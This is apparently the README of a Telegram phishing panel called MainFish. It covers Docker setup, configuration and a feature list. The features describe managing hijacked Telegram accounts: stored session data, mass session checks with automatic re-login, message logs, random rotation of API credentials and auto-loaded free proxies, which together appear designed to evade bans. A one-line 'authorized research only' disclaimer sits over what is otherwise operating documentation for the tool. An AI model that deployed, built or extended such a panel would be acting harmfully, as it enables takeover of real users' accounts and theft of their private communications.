# MainFish – Telegram Phishing Panel

> **⚠️ For authorized security research only. Do not use on real users without consent.**

## Quick Start (Docker)

### 1. Copy and configure environment

```bash
cp SYKA/.env.example SYKA/.env
# Edit SYKA/.env and set all required values
```

**Required variables in `.env`:**

| Variable | Description |
|---|---|
| `SECRET_KEY` | Long random string (use `python -c "import secrets; print(secrets.token_hex(32))"`) |
| `POSTGRES_PASSWORD` | Strong Postgres password |
| `TG_API_ID` / `TG_API_HASH` | From https://my.telegram.org/apps (fallback if no DB credentials) |
| `ADMIN_USERNAME` | Initial admin login |
| `ADMIN_PASSWORD_HASH` | bcrypt hash (see below) |
| `SESSION_ENCRYPTION_KEY` | Fernet key (see below) |
| `NOTIFICATION_BOT_TOKEN` | (Optional) Telegram bot token for login alerts |
| `NOTIFICATION_CHAT_ID` | (Optional) Telegram chat ID to receive alerts |
| `RATE_LIMIT_LOGIN` | (Optional) Login rate limit, e.g. `10 per minute` |
| `RATE_LIMIT_API` | (Optional) API rate limit, e.g. `60 per minute` |
| `PROXY_REFRESH_HOURS` | (Optional) Hours between auto proxy refresh (default: 6) |

**Generate password hash:**
```bash
python -c "import bcrypt; print(bcrypt.hashpw(b'yourpassword', bcrypt.gensalt()).decode())"
```

**Generate Fernet encryption key:**
```bash
python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
```

### 2. Build and run

```bash
cd SYKA
docker compose up --build
```

Services:
- **web** – Flask/Gunicorn app on port 8000 (behind Nginx)
- **nginx** – Reverse proxy on ports 80/443
- **postgres** – PostgreSQL database
- **redis** – Redis (Celery broker + rate limiter backend)
- **celery_worker** – Celery worker for background tasks
- **celery_beat** – Celery beat scheduler

### 3. Access the admin panel

Navigate to `https://yourdomain.com/admin` (or `http://localhost/admin` without SSL).

## Local Development

```bash
cd SYKA
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

export DATABASE_URL=sqlite:///data.db
export SECRET_KEY=dev-only-key
export TG_API_ID=0
export TG_API_HASH=dev

python run.py
```

## Running Tests

```bash
cd SYKA
pip install pytest
python -m pytest tests/ -v
```

## Database Migrations

```bash
# Inside the SYKA directory with DATABASE_URL set:
alembic upgrade head

# Auto-generate a new migration after model changes:
alembic revision --autogenerate -m "describe change"
```

## Architecture

```
SYKA/
├── web/               # Flask app
│   ├── app.py         # Application factory (create_app)
│   ├── extensions.py  # SQLAlchemy, LoginManager, Limiter, Migrate
│   ├── routes/        # Blueprints: public, admin, api
│   ├── middlewares/   # Auth (admin/editor/viewer roles), IP whitelist, rate limit
│   └── templates/     # Jinja2 templates (dark blue theme)
├── models/            # SQLAlchemy models
│   ├── account_log.py # Per-account action history
│   └── api_credential.py # API ID/Hash pairs for rotation
├── services/          # Business logic (telegram, proxy, backup, export)
│   └── telegram/
│       └── credentials.py # Random API credential rotation
├── tasks/             # Celery tasks
│   ├── session_checker.py   # Mass session validity + auto re-login
│   └── proxy_autoloader.py  # Auto-load free proxies from public sources
├── core/              # Config, database, logger, exceptions
├── utils/             # Encryption, helpers, validators
├── alembic/           # Database migrations
├── nginx/             # Nginx config
├── Dockerfile
├── docker-compose.yml
└── requirements.txt
```

## New Features

### Dark Blue Admin UI
The admin panel uses a dark blue palette (#0a1929, #1e2f4f, #2563eb) with dark mode enabled by default. FontAwesome icons are used throughout.

### Role-Based Access
Three roles are supported: `superadmin` (full access), `admin`/`editor` (read-write), `viewer` (read-only). The `viewer` role is blocked from all mutating actions.

### Server Monitoring (`/admin/monitoring`)
- Live CPU/RAM/Disk metrics refreshed every 7 seconds via AJAX
- Overload warnings (>80% CPU, >90% RAM)
- Version info: Python, Flask, SQLAlchemy, Telethon, last git commit

### API Credential Rotation (`/admin/settings/api_credentials`)
- Store multiple Telegram API ID/Hash pairs
- Each request randomly selects an active pair from the database
- CRUD interface with toggle/enable/disable

### Account Health Status
The accounts table shows color-coded status indicators:
- 🟢 Green = active
- 🟡 Yellow = 2FA required
- 🔴 Red = banned/deactivated
- ⚫ Gray = expired/inactive

### Account Activity History
Click the clock icon on any account to view its full action log (session checks, messages sent, re-login attempts, etc.) with timestamp, result, initiator, and IP.

### Session Validity Checks
- Per-account: click the shield icon to trigger a Celery task
- Mass check: "Check all sessions" button in the accounts header
- Automated: scheduled every `PROXY_REFRESH_HOURS` hours via Celery Beat
- Auto re-login: attempted automatically for expired sessions

### Automatic Proxy Loading
- Click "Auto-Load" on the proxies page to fetch from public PROXY-List repositories
- New proxies are queued for validation automatically
- Scheduled via Celery Beat every `PROXY_REFRESH_HOURS` hours

### Telegram Bot Alerts
Set `NOTIFICATION_BOT_TOKEN` and `NOTIFICATION_CHAT_ID` in `.env` to receive a Telegram message on every admin login event.

## Security Notes

- Admin panel is protected by Flask-Login + rate limiting + optional IP whitelist.
- Set `IP_WHITELIST` in `.env` to restrict admin access by IP (bypasses rate limits).
- All Telegram session data is encrypted using Fernet symmetric encryption.
- Nginx passes real client IPs via `X-Real-IP` / `X-Forwarded-For`; the app uses `ProxyFix` to read them correctly.
- Admin login events are logged to the database and optionally sent as Telegram bot alerts.
- API credentials (API ID/Hash) are stored in the database and never written to environment files.
- Never commit `.env` or any file with real secrets.
